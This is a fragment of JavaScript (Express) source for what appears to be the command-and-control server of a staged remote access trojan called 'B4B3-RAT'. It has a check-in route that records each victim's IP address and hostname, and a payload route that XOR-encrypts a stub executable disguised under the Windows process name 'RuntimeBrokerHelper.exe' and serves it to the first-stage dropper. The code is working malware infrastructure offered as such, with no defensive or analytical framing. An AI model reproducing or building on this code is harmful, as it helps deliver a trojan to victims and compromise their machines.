const LOG_FILE = path.join(DATA_DIR, "stage_events.json");

// XOR key for payload encryption (8 bytes, embedded in stager too)
const XOR_KEY = Buffer.from([0x57, 0xA1, 0x3F, 0xC8, 0xB2, 0xDE, 0x94, 0x6A]);

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ── Helpers ───────────────────────────────────────────────────────────────────

function xorBuf(buf) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ XOR_KEY[i % XOR_KEY.length];
  return out;
}

function readEvents() {
  try { return JSON.parse(fs.readFileSync(LOG_FILE, "utf8")); } catch (_) { return []; }
}

function appendEvent(evt) {
  const events = readEvents();
  events.unshift(evt);
  if (events.length > 1000) events.splice(1000);
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(events, null, 2)); } catch (_) {}
}

function getIP(req) {
  return (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown").split(",")[0].trim();
}

function getPayloadBuf() {
  // Prefer the pre-configured stub in downloads/
  const configured = path.join(DL_DIR, "RuntimeBrokerHelper.exe");
  if (fs.existsSync(configured)) return fs.readFileSync(configured);
  // Fall back to raw Stub.exe
  const raw = path.join(__dirname, "..", "..", "B4B3-RAT", "Stub", "Stub.exe");
  if (fs.existsSync(raw)) return fs.readFileSync(raw);
  return null;
}

// ── Stage 1 → C2: Check-in ────────────────────────────────────────────────────

router.get("/stage/checkin", (req, res) => {
  const ip   = getIP(req);
  const ua   = req.headers["user-agent"] || "-";
  const host = req.query.host || "";
  const evt  = { ts: Date.now(), type: "checkin", ip, ua, host };
  appendEvent(evt);
  console.log(`[stage] CHECKIN  ip=${ip}  host=${host || "(none)"}`);
  res.json({ ok: true, ts: evt.ts });
});

// ── Stage 1 → C2: Payload fetch ───────────────────────────────────────────────

router.get("/stage/payload", (req, res) => {
  const ip  = getIP(req);
  const ua  = req.headers["user-agent"] || "-";
  const buf = getPayloadBuf();

  if (!buf) {
    const evt = { ts: Date.now(), type: "fetch_fail", ip, ua, reason: "no_payload" };
    appendEvent(evt);
    console.warn(`[stage] FETCH_FAIL ip=${ip} — no payload ready`);
    return res.status(404).send("Stage 2 not ready. Build stub in Builder tab first.");
  }

  const encrypted = xorBuf(buf);
  const evt = { ts: Date.now(), type: "fetch", ip, ua, bytes: encrypted.length };
  appendEvent(evt);
  console.log(`[stage] FETCH  ip=${ip}  size=${encrypted.length}`);

  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Length", encrypted.length);
  res.send(encrypted);
});

